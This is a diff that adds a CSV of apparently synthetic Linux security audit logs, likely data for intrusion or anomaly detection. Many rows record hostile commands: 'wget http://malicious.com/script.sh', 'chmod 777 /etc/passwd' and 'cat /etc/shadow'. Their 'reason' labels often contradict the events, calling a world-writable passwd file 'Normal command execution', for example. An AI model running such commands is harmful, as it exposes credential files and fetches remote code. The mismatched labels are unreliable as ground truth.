@@ -1,0 +1,501 @@
+timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
+2025-05-03T16:51:17Z,U9923,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.85,56501,Normal command execution
+2025-05-05T08:16:17Z,U4033,file_access,/etc/passwd,write,,success,10.0.0.199,92809,Normal command execution
+2025-05-04T08:53:17Z,U1728,file_access,/etc/shadow,read,,success,10.0.0.142,12990,Routine system scan
+2025-05-03T13:04:17Z,U1392,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.176,89122,Privileged command executed
+2025-05-03T18:29:17Z,U1476,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.168,80010,Normal command execution
+2025-05-06T07:12:17Z,U4672,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,19057,Access to sensitive file
+2025-05-01T18:50:17Z,U3604,file_access,/etc/passwd,write,,success,10.0.0.132,49847,Administrative task
+2025-05-02T07:30:17Z,U8972,exec,/bin/bash,run,sudo su,success,10.0.0.148,44175,Normal command execution
+2025-04-30T20:45:17Z,U8274,file_access,/etc/passwd,write,,failure,10.0.0.219,58591,Segmentation fault
+2025-05-05T03:02:17Z,U4973,file_access,/etc/shadow,write,,success,10.0.0.70,49733,Routine system scan
+2025-05-01T00:13:17Z,U4394,file_access,/etc/passwd,write,,success,10.0.0.247,20294,Routine system scan
+2025-05-04T19:26:17Z,U4819,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.140,68887,Administrative task
+2025-05-06T07:41:17Z,U4633,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.175,98057,Normal command execution
+2025-04-30T17:22:17Z,U5005,file_access,/etc/shadow,read,,failure,10.0.0.123,36770,Permission denied
+2025-04-30T16:15:17Z,U3446,exec,/bin/sudo,run,sudo su,failure,10.0.0.109,53635,Permission denied
+2025-05-06T00:56:17Z,U8971,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.14,77487,Access to sensitive file
+2025-05-03T02:48:17Z,U2826,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.238,14104,Invalid argument
+2025-05-01T19:09:17Z,U8462,exec,/usr/bin/top,run,chmod 777 /etc/passwd,failure,10.0.0.71,11160,Invalid argument
+2025-05-03T19:18:17Z,U2923,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,60510,Access to sensitive file
+2025-05-01T04:19:17Z,U8914,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.87,86849,Normal command execution
+2025-05-06T21:23:17Z,U9140,file_access,/etc/shadow,read,,success,10.0.0.130,88248,Privileged command executed
+2025-05-03T02:35:17Z,U4216,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.24,14096,Invalid argument
+2025-05-04T06:34:17Z,U7457,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.3,65804,Segmentation fault
+2025-05-01T10:36:17Z,U9502,file_access,/etc/shadow,read,,failure,10.0.0.183,22670,Permission denied
+2025-05-03T22:57:17Z,U7859,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.121,39649,Routine system scan
+2025-05-03T05:43:17Z,U1892,exec,/bin/bash,run,ls -al /etc,success,10.0.0.201,87747,Administrative task
+2025-05-03T05:43:17Z,U6353,file_access,/etc/shadow,read,,success,10.0.0.84,72871,Routine system scan
+2025-05-04T20:03:17Z,U1415,file_access,/etc/shadow,write,,failure,10.0.0.100,19910,Permission denied
+2025-05-04T13:53:17Z,U9301,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.120,80817,Routine system scan
+2025-05-03T05:26:17Z,U7925,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.198,21884,Normal command execution
+2025-05-02T04:18:17Z,U6511,exec,/bin/bash,run,sudo su,success,10.0.0.246,50645,Access to sensitive file
+2025-05-02T18:43:17Z,U7686,exec,/bin/sudo,run,sudo su,success,10.0.0.2,15573,Administrative task
+2025-05-06T23:03:17Z,U8756,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,success,10.0.0.192,21166,Access to sensitive file
+2025-05-03T18:17:17Z,U1473,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.205,44628,Normal command execution
+2025-04-30T16:37:17Z,U2825,exec,/bin/bash,run,sudo su,success,10.0.0.188,89185,Privileged command executed
+2025-05-05T05:41:17Z,U4937,exec,/usr/bin/wget,run,sudo su,success,10.0.0.231,76624,Access to sensitive file
+2025-05-04T21:54:17Z,U9616,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.108,44495,Permission denied
+2025-05-02T05:40:17Z,U4891,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.102,59929,Normal command execution
+2025-05-05T17:45:17Z,U3707,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.175,80894,Routine system scan
+2025-05-02T20:11:17Z,U1996,file_access,/etc/passwd,write,,failure,10.0.0.48,22657,Execution blocked by policy
+2025-04-30T18:18:17Z,U2124,file_access,/etc/passwd,write,,success,10.0.0.51,60820,Normal command execution
+2025-04-30T09:17:17Z,U7036,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.79,93455,Routine system scan
+2025-05-06T12:11:17Z,U1885,file_access,/etc/passwd,write,,success,10.0.0.232,65337,Privileged command executed
+2025-04-30T14:10:17Z,U7932,file_access,/etc/shadow,write,,success,10.0.0.145,53849,Routine system scan
+2025-05-06T06:08:17Z,U9120,exec,/usr/bin/wget,run,touch /tmp/testfile,failure,10.0.0.61,45329,Invalid argument
+2025-05-06T17:45:17Z,U5539,file_access,/etc/shadow,write,,failure,10.0.0.123,84884,Segmentation fault
+2025-05-06T14:17:17Z,U1498,exec,/usr/bin/wget,run,sudo su,success,10.0.0.166,89094,Administrative task
+2025-05-05T17:00:17Z,U7442,file_access,/etc/passwd,read,,success,10.0.0.93,60174,Privileged command executed
+2025-04-30T09:42:17Z,U3590,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.126,66932,Routine system scan
+2025-05-05T10:06:17Z,U5483,file_access,/etc/shadow,write,,failure,10.0.0.94,59532,Execution blocked by policy
+2025-05-06T10:26:17Z,U9282,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.172,27892,Normal command execution
+2025-05-03T21:28:17Z,U4041,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.90,22428,Access to sensitive file
+2025-05-04T10:06:17Z,U1773,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,success,10.0.0.126,84442,Access to sensitive file
+2025-05-05T01:45:17Z,U6763,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.102,69464,Routine system scan
+2025-05-05T07:31:17Z,U2706,file_access,/etc/shadow,write,,success,10.0.0.150,68082,Privileged command executed
+2025-05-02T02:21:17Z,U9631,file_access,/etc/shadow,read,,success,10.0.0.53,23891,Privileged command executed
+2025-05-06T08:07:17Z,U1802,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.221,83790,Routine system scan
+2025-05-04T23:16:17Z,U6689,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.80,44299,Routine system scan
+2025-05-04T08:41:17Z,U5635,exec,/bin/sudo,run,sudo su,success,10.0.0.5,22926,Administrative task
+2025-05-03T01:30:17Z,U7841,file_access,/etc/shadow,read,,success,10.0.0.100,35641,Normal command execution
+2025-05-03T13:16:17Z,U2582,file_access,/etc/passwd,read,,success,10.0.0.23,23395,Administrative task
+2025-05-07T03:48:17Z,U4191,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.78,89391,Execution blocked by policy
+2025-05-03T13:02:17Z,U7761,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.168,21097,Routine system scan
+2025-05-06T17:20:17Z,U3248,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.178,85580,Administrative task
+2025-05-01T19:50:17Z,U9460,file_access,/etc/passwd,write,,success,10.0.0.66,57735,Normal command execution
+2025-05-03T23:03:17Z,U7191,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.79,78999,Privileged command executed
+2025-05-01T10:11:17Z,U8465,exec,/usr/bin/wget,run,sudo su,success,10.0.0.183,19120,Routine system scan
+2025-05-04T11:03:17Z,U4469,file_access,/etc/passwd,read,,success,10.0.0.35,59125,Administrative task
+2025-05-05T12:37:17Z,U3474,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.207,61210,Routine system scan
+2025-05-02T23:35:17Z,U9009,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.131,64676,Administrative task
+2025-05-02T03:42:17Z,U6217,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.78,91523,Access to sensitive file
+2025-05-04T23:13:17Z,U9947,file_access,/etc/passwd,write,,success,10.0.0.145,50133,Privileged command executed
+2025-05-01T12:28:17Z,U2176,exec,/bin/sudo,run,sudo su,failure,10.0.0.76,18192,Execution blocked by policy
+2025-04-30T16:01:17Z,U3769,exec,/bin/bash,run,ls -al /etc,success,10.0.0.130,18204,Administrative task
+2025-05-04T08:37:17Z,U3144,exec,/usr/bin/wget,run,wget http://malicious.com/script.sh,failure,10.0.0.158,60418,Segmentation fault
+2025-05-04T12:14:17Z,U1931,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.181,57985,Routine system scan
+2025-05-07T02:17:17Z,U6594,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.149,47617,Command not found
+2025-05-02T11:16:17Z,U2460,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.106,21863,Routine system scan
+2025-05-04T09:54:17Z,U1756,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.70,17951,Privileged command executed
+2025-05-07T00:15:17Z,U6910,file_access,/etc/shadow,read,,failure,10.0.0.209,56182,Permission denied
+2025-05-01T18:53:17Z,U5021,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.137,46742,Privileged command executed
+2025-05-03T12:53:17Z,U1608,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.81,76349,Access to sensitive file
+2025-05-04T11:46:17Z,U5022,file_access,/etc/passwd,read,,success,10.0.0.114,42707,Privileged command executed
+2025-05-01T04:49:17Z,U4982,file_access,/etc/shadow,write,,success,10.0.0.55,62795,Privileged command executed
+2025-05-02T07:11:17Z,U2168,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.61,83081,Privileged command executed
+2025-05-05T06:37:17Z,U1432,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.129,18602,Privileged command executed
+2025-05-01T19:03:17Z,U7616,file_access,/etc/shadow,read,,success,10.0.0.36,84705,Access to sensitive file
+2025-05-04T12:06:17Z,U6955,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,38325,Routine system scan
+2025-05-03T01:48:17Z,U3248,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.56,93803,Routine system scan
+2025-05-03T11:41:17Z,U2834,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.198,39980,Administrative task
+2025-05-04T04:12:17Z,U6386,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.172,46575,Access to sensitive file
+2025-05-05T12:52:17Z,U9305,file_access,/etc/passwd,read,,success,10.0.0.163,46489,Access to sensitive file
+2025-05-01T01:07:17Z,U1268,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.58,22790,Routine system scan
+2025-04-30T08:08:17Z,U4207,file_access,/etc/shadow,read,,failure,10.0.0.146,45118,Permission denied
+2025-05-01T13:07:17Z,U8925,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.93,65502,Administrative task
+2025-05-01T10:14:17Z,U1232,file_access,/etc/shadow,write,,success,10.0.0.196,34906,Privileged command executed
+2025-04-30T07:40:17Z,U4867,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.160,86595,Administrative task
+2025-05-01T16:54:17Z,U7904,file_access,/etc/passwd,read,,success,10.0.0.97,25131,Normal command execution
+2025-05-03T07:57:17Z,U3092,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.128,39573,Privileged command executed
+2025-05-05T11:18:17Z,U5781,exec,/bin/sudo,run,cat /etc/shadow,failure,10.0.0.50,67166,Command not found
+2025-05-06T17:55:17Z,U8450,file_access,/etc/passwd,write,,failure,10.0.0.30,28638,Segmentation fault
+2025-05-01T21:57:17Z,U4151,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.12,25186,Administrative task
+2025-05-06T15:10:17Z,U6281,file_access,/etc/shadow,read,,failure,10.0.0.217,96823,Segmentation fault
+2025-05-02T11:08:17Z,U6637,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.231,52131,Access to sensitive file
+2025-05-06T15:36:17Z,U3898,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.218,71091,Privileged command executed
+2025-05-05T19:39:17Z,U3359,file_access,/etc/passwd,read,,success,10.0.0.250,48069,Access to sensitive file
+2025-05-03T14:22:17Z,U8768,file_access,/etc/shadow,read,,success,10.0.0.76,70403,Access to sensitive file
+2025-05-06T20:03:17Z,U1762,file_access,/etc/shadow,read,,success,10.0.0.23,98516,Access to sensitive file
+2025-05-01T06:11:17Z,U8945,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.193,62960,Segmentation fault
+2025-05-05T03:36:17Z,U2069,exec,/usr/bin/top,run,sudo su,failure,10.0.0.169,48803,Segmentation fault
+2025-05-06T18:37:17Z,U1340,exec,/bin/bash,run,sudo su,success,10.0.0.27,56834,Administrative task
+2025-05-06T22:32:17Z,U9466,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.171,35931,Routine system scan
+2025-05-03T16:29:17Z,U3419,file_access,/etc/shadow,write,,success,10.0.0.168,91132,Administrative task
+2025-05-03T12:51:17Z,U6228,exec,/usr/bin/top,run,sudo su,success,10.0.0.88,67699,Normal command execution
+2025-05-02T22:53:17Z,U3181,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.1,70657,Privileged command executed
+2025-05-06T07:04:17Z,U7231,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.167,43533,Command not found
+2025-05-02T19:22:17Z,U7793,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.52,87253,Routine system scan
+2025-05-02T16:55:17Z,U2535,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,62364,Normal command execution
+2025-05-01T21:30:17Z,U8685,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.140,34628,Access to sensitive file
+2025-05-06T05:59:17Z,U1888,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.173,69232,Administrative task
+2025-05-05T13:01:17Z,U3857,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.69,90988,Permission denied
+2025-05-06T08:10:17Z,U2394,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,76355,Normal command execution
+2025-05-03T22:05:17Z,U7754,exec,/bin/sudo,run,cat /etc/shadow,failure,10.0.0.205,34969,Permission denied
+2025-05-04T08:36:17Z,U7072,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.17,83339,Privileged command executed
+2025-05-05T16:07:17Z,U2209,file_access,/etc/passwd,write,,success,10.0.0.211,76625,Access to sensitive file
+2025-05-04T03:47:17Z,U1796,file_access,/etc/passwd,write,,success,10.0.0.62,15971,Access to sensitive file
+2025-05-03T06:10:17Z,U4954,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.117,33517,Privileged command executed
+2025-05-03T08:53:17Z,U2660,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.254,90688,Administrative task
+2025-05-03T15:13:17Z,U3510,exec,/bin/sudo,run,chmod 777 /etc/passwd,success,10.0.0.71,62336,Routine system scan
+2025-05-06T18:58:17Z,U9353,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.63,63308,Invalid argument
+2025-05-02T15:58:17Z,U9994,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.46,12664,Normal command execution
+2025-05-05T04:11:17Z,U4608,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.216,35650,Command not found
+2025-05-05T02:53:17Z,U2270,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.71,35931,Privileged command executed
+2025-05-04T09:34:17Z,U3022,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.241,26017,Administrative task
+2025-05-06T00:09:17Z,U1219,file_access,/etc/passwd,read,,success,10.0.0.224,22735,Access to sensitive file
+2025-05-01T21:57:17Z,U2086,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.51,72746,Routine system scan
+2025-05-04T08:15:17Z,U3350,file_access,/etc/shadow,write,,success,10.0.0.136,77314,Privileged command executed
+2025-05-04T12:47:17Z,U5839,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.7,88500,Privileged command executed
+2025-05-05T15:43:17Z,U7434,file_access,/etc/shadow,write,,success,10.0.0.179,47158,Normal command execution
+2025-05-05T21:21:17Z,U5736,file_access,/etc/shadow,read,,success,10.0.0.98,36417,Routine system scan
+2025-05-05T09:29:17Z,U4727,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,76276,Access to sensitive file
+2025-05-02T07:21:17Z,U5660,file_access,/etc/shadow,write,,success,10.0.0.99,30467,Normal command execution
+2025-05-04T02:05:17Z,U9038,exec,/bin/bash,run,ls -al /etc,success,10.0.0.1,79171,Privileged command executed
+2025-05-06T05:13:17Z,U7870,file_access,/etc/passwd,read,,failure,10.0.0.136,47414,Execution blocked by policy
+2025-05-04T03:40:17Z,U2290,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.117,59114,Routine system scan
+2025-05-06T16:44:17Z,U3973,exec,/usr/bin/top,run,sudo su,success,10.0.0.127,46946,Routine system scan
+2025-05-02T00:54:17Z,U5354,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.209,39595,Access to sensitive file
+2025-05-03T22:42:17Z,U1337,exec,/usr/bin/top,run,cat /etc/shadow,failure,10.0.0.206,51716,Segmentation fault
+2025-05-03T09:28:17Z,U4777,exec,/usr/bin/wget,run,sudo su,success,10.0.0.44,47711,Privileged command executed
+2025-05-02T03:45:17Z,U3680,file_access,/etc/passwd,read,,failure,10.0.0.137,18701,Permission denied
+2025-05-01T17:00:17Z,U3952,file_access,/etc/passwd,read,,success,10.0.0.118,45423,Normal command execution
+2025-05-01T11:30:17Z,U9337,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.203,28154,Segmentation fault
+2025-05-02T20:48:17Z,U3634,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,79095,Normal command execution
+2025-05-06T05:24:17Z,U7649,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.32,14291,Command not found
+2025-05-02T06:09:17Z,U1914,file_access,/etc/shadow,read,,success,10.0.0.40,56955,Administrative task
+2025-04-30T15:25:17Z,U6941,file_access,/etc/passwd,write,,success,10.0.0.239,10115,Privileged command executed
+2025-05-06T04:57:17Z,U8145,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.192,84103,Routine system scan
+2025-05-02T10:30:17Z,U3417,file_access,/etc/passwd,read,,failure,10.0.0.220,26109,Permission denied
+2025-05-05T17:05:17Z,U5808,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.126,19628,Segmentation fault
+2025-04-30T08:31:17Z,U1543,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.21,29604,Access to sensitive file
+2025-05-04T02:55:17Z,U9062,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.132,90715,Normal command execution
+2025-05-02T16:11:17Z,U3573,file_access,/etc/passwd,read,,success,10.0.0.190,34491,Normal command execution
+2025-05-02T12:25:17Z,U5438,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.67,61032,Administrative task
+2025-05-06T00:51:17Z,U8136,exec,/bin/bash,run,sudo su,success,10.0.0.145,98693,Routine system scan
+2025-05-02T09:21:17Z,U2545,file_access,/etc/passwd,write,,success,10.0.0.225,71417,Access to sensitive file
+2025-05-02T11:39:17Z,U4691,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.3,17008,Privileged command executed
+2025-05-03T10:02:17Z,U6025,exec,/usr/bin/wget,run,sudo su,success,10.0.0.254,61883,Privileged command executed
+2025-05-02T11:25:17Z,U1055,file_access,/etc/shadow,write,,success,10.0.0.213,91129,Access to sensitive file
+2025-05-05T03:31:17Z,U7592,file_access,/etc/shadow,write,,success,10.0.0.97,95912,Administrative task
+2025-04-30T08:25:17Z,U9896,exec,/usr/bin/top,run,sudo su,success,10.0.0.89,82317,Administrative task
+2025-05-04T23:28:17Z,U9167,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.222,11858,Privileged command executed
+2025-05-05T15:01:17Z,U5231,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,87725,Access to sensitive file
+2025-05-01T10:34:17Z,U4963,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.208,52531,Normal command execution
+2025-05-07T00:31:17Z,U5021,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.154,53813,Privileged command executed
+2025-05-03T08:13:17Z,U8241,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.53,26048,Access to sensitive file
+2025-05-03T18:12:17Z,U9671,file_access,/etc/shadow,write,,success,10.0.0.183,27825,Access to sensitive file
+2025-05-06T00:28:17Z,U4855,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.183,22779,Administrative task
+2025-05-07T00:18:17Z,U6701,file_access,/etc/shadow,write,,success,10.0.0.158,95503,Privileged command executed
+2025-05-03T00:02:17Z,U1881,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.123,63870,Administrative task
+2025-05-01T10:41:17Z,U5667,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.208,45052,Command not found
+2025-05-05T13:37:17Z,U7803,exec,/bin/bash,run,ls -al /etc,failure,10.0.0.94,15503,Permission denied
+2025-05-01T18:24:17Z,U9616,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.202,50580,Administrative task
+2025-05-04T03:29:17Z,U4697,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.178,56225,Access to sensitive file
+2025-05-04T06:39:17Z,U4198,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.152,59903,Routine system scan
+2025-05-04T00:36:17Z,U3371,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.236,20735,Execution blocked by policy
+2025-05-01T23:11:17Z,U4506,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,31459,Administrative task
+2025-05-02T04:53:17Z,U1451,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.130,20029,Normal command execution
+2025-05-06T23:36:17Z,U6088,file_access,/etc/shadow,read,,success,10.0.0.222,60032,Access to sensitive file
+2025-04-30T21:00:17Z,U4448,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.137,23786,Access to sensitive file
+2025-05-03T10:05:17Z,U4114,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.252,33181,Access to sensitive file
+2025-04-30T13:49:17Z,U1781,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.91,17941,Routine system scan
+2025-05-01T12:30:17Z,U6480,file_access,/etc/shadow,read,,success,10.0.0.148,98846,Privileged command executed
+2025-05-01T15:28:17Z,U6420,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.179,70551,Routine system scan
+2025-05-03T13:25:17Z,U6743,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.175,65703,Privileged command executed
+2025-04-30T20:23:17Z,U9612,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.28,90769,Administrative task
+2025-05-05T00:56:17Z,U6727,file_access,/etc/shadow,write,,success,10.0.0.163,32399,Privileged command executed
+2025-05-02T10:14:17Z,U5625,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.152,32016,Segmentation fault
+2025-05-06T03:04:17Z,U8575,file_access,/etc/passwd,read,,success,10.0.0.221,16146,Privileged command executed
+2025-05-02T08:26:17Z,U2622,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.62,27973,Administrative task
+2025-05-06T02:20:17Z,U2196,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.221,78604,Access to sensitive file
+2025-05-05T22:09:17Z,U3419,exec,/usr/bin/top,run,sudo su,success,10.0.0.6,17484,Administrative task
+2025-05-06T09:33:17Z,U6665,file_access,/etc/shadow,write,,success,10.0.0.252,54700,Access to sensitive file
+2025-05-02T12:47:17Z,U3184,file_access,/etc/shadow,write,,success,10.0.0.25,69032,Access to sensitive file
+2025-05-05T20:57:17Z,U2388,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.29,69110,Administrative task
+2025-05-05T05:24:17Z,U2964,exec,/bin/bash,run,ls -al /etc,success,10.0.0.225,73858,Privileged command executed
+2025-05-02T16:41:17Z,U1246,file_access,/etc/shadow,read,,success,10.0.0.71,56183,Administrative task
+2025-05-02T15:34:17Z,U6628,file_access,/etc/passwd,read,,success,10.0.0.218,15909,Access to sensitive file
+2025-05-06T00:39:17Z,U1393,file_access,/etc/passwd,read,,success,10.0.0.167,28274,Normal command execution
+2025-05-01T03:29:17Z,U3331,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.201,88123,Privileged command executed
+2025-05-05T04:25:17Z,U1249,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,79501,Privileged command executed
+2025-05-03T21:43:17Z,U3123,file_access,/etc/passwd,read,,success,10.0.0.223,96233,Routine system scan
+2025-05-05T17:11:17Z,U7533,file_access,/etc/shadow,read,,success,10.0.0.216,37956,Administrative task
+2025-05-04T19:00:17Z,U2051,file_access,/etc/passwd,read,,success,10.0.0.147,54976,Normal command execution
+2025-05-04T10:59:17Z,U8656,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.74,81286,Permission denied
+2025-05-03T22:09:17Z,U1659,file_access,/etc/passwd,write,,success,10.0.0.89,93455,Access to sensitive file
+2025-05-01T18:52:17Z,U6733,exec,/bin/sudo,run,sudo su,success,10.0.0.143,13342,Privileged command executed
+2025-05-03T19:34:17Z,U3891,file_access,/etc/passwd,write,,success,10.0.0.168,12791,Administrative task
+2025-05-07T03:21:17Z,U6380,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.200,82667,Privileged command executed
+2025-05-02T14:33:17Z,U6805,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.213,15079,Administrative task
+2025-05-04T22:40:17Z,U9501,file_access,/etc/passwd,write,,failure,10.0.0.103,21846,Segmentation fault
+2025-05-01T09:02:17Z,U6517,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,97267,Access to sensitive file
+2025-05-02T04:49:17Z,U5392,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.210,24890,Administrative task
+2025-05-03T23:55:17Z,U8450,exec,/bin/bash,run,wget http://malicious.com/script.sh,failure,10.0.0.62,17404,Execution blocked by policy
+2025-05-02T00:27:17Z,U3096,exec,/usr/bin/top,run,cat /etc/shadow,failure,10.0.0.93,35934,Segmentation fault
+2025-05-01T03:51:17Z,U9401,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.232,94845,Normal command execution
+2025-04-30T11:51:17Z,U2676,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.246,44549,Access to sensitive file
+2025-05-06T03:46:17Z,U5815,exec,/bin/bash,run,chmod 777 /etc/passwd,failure,10.0.0.12,50986,Execution blocked by policy
+2025-05-06T18:39:17Z,U9203,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.203,61250,Administrative task
+2025-04-30T22:05:17Z,U8835,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,98057,Administrative task
+2025-04-30T17:18:17Z,U6881,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.128,72817,Access to sensitive file
+2025-05-05T23:01:17Z,U4173,file_access,/etc/shadow,write,,success,10.0.0.239,34954,Routine system scan
+2025-05-06T16:40:17Z,U4779,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.36,73709,Normal command execution
+2025-05-02T09:37:17Z,U4782,file_access,/etc/passwd,write,,failure,10.0.0.183,12867,Permission denied
+2025-05-05T06:17:17Z,U6742,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.234,56841,Routine system scan
+2025-04-30T06:58:17Z,U9473,exec,/bin/sudo,run,sudo su,failure,10.0.0.36,66062,Permission denied
+2025-05-06T21:50:17Z,U8665,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.204,16015,Privileged command executed
+2025-05-06T17:31:17Z,U2783,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.248,28545,Privileged command executed
+2025-05-04T14:39:17Z,U5479,file_access,/etc/shadow,write,,success,10.0.0.53,18670,Normal command execution
+2025-05-04T22:38:17Z,U9940,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.118,94614,Access to sensitive file
+2025-05-04T18:47:17Z,U1628,file_access,/etc/shadow,read,,success,10.0.0.232,26466,Normal command execution
+2025-05-06T18:31:17Z,U4206,exec,/bin/sudo,run,wget http://malicious.com/script.sh,success,10.0.0.34,23277,Administrative task
+2025-05-04T17:19:17Z,U2768,file_access,/etc/passwd,write,,failure,10.0.0.154,59917,Command not found
+2025-05-01T22:53:17Z,U3481,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.239,25041,Access to sensitive file
+2025-04-30T10:30:17Z,U3202,file_access,/etc/shadow,write,,success,10.0.0.152,98041,Privileged command executed
